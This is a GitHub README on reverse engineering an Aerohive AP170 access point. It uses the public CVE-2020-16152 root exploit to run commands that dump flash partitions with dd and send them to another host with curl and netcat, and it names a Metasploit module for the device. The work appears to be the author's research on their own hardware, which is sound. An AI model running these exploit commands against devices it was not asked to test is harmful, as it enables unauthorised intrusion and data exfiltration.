# HiveAP170
Investigating the AP170 from Aerohive

|Mainboard|UART|
|:-:|:-:|
|![Mainboard](https://github.com/richard718/HiveAP170/assets/86638482/da3ce224-a6a7-4c31-b824-fc965f420ab2)|![UART](https://github.com/richard718/HiveAP170/assets/86638482/0c062f73-9b0c-4715-9315-7670588971c1)|

# What Firmware extraction options are there :-

+ ~~JTAG~~ not identified.
+ ~~Extract via UART as ascii text~~[^1].
+ ~~tftpput from U-BOOT~~ unsupported in this firmware.
+ ~~Metasploit~~[^2].
+ CVE.

The original exploit code is published at [CVE-2020-16152](https://github.com/eriknl/CVE-2020-16152) and enables root access.

## Extracting the Firmware

download CVE-2020-16152.py

Inital attempts to use the exploit were unsuccessful, changed https to http in CVE-2020-16152.py.

get the list of block devices.

```bash
./CVE-2020-16152.py AP170.internal 'cat /proc/mtd' > mtd.txt 
```

|dev:|size|erasesize|name|
|-|-|-|-|
|mtd0:|02a00000|00040000|"App Image"|
|mtd1:|00f00000|00040000|"JFFS2"|
|mtd2:|00500000|00040000|"Kernel Image"|
|mtd3:|00080000|00040000|"Reserved"|
|mtd4:|00040000|00040000|"Static Boot Info Backup"|
|mtd5:|00040000|00040000|"Static Boot Info"|
|mtd6:|00040000|00040000|"Hardware Info"|
|mtd7:|00040000|00040000|"Uboot Env"|
|mtd8:|00080000|00040000|"Uboot"|

extract and transfer each image.

```bash
./CVE-2020-16152.py AP170.internal 'dd if=/dev/mtdx of=/f/mtdx.bin' 
./CVE-2020-16152.py AP170.internal 'curl -T /f/mtdx.bin ftp://ftphost.internal/mtdx.bin'
./CVE-2020-16152.py AP170.internal 'rm /f/mtdx.bin'
```
writing mtd0 and mtd1 to `/f` resulted in corruption, copying to `/tmp` worked for mtd1 but not mtd0 it is too big for `/tmp`.

```bash
# copy mtd1 to /tmp
./CVE-2020-16152.py AP170.internal 'dd if=/dev/mtd1 of=/tmp/mtd1.bin' 
./CVE-2020-16152.py AP170.internal 'curl -T /tmp/mtd1.bin ftp://ftphost.internal/mtd1.bin'
./CVE-2020-16152.py AP170.internal 'rm /tmp/mtd1.bin'
```

```bash
# have to netcat it
# Sender
./CVE-2020-16152.py AP170.internal 'nc ftphost.internal 1234 < /dev/mtd0'
# Receiver 
nc -l 1234 > mtd0.bin
```

# What other useful detail can be pulled out ...

[UBoot Commands](extracted_details/uboot.log)\
[Busybox Commands](extracted_details/busybox.log)\
[Root FS listing](extracted_details/root_fs.log)

[^1]: Although dumping as ascii hex and converting back to binary is possible it is time consuming and prone to error.  
[^2]: search aerohive; info exploit/unix/webapp/aerohive_netconfig_lfi_log_poison_rce  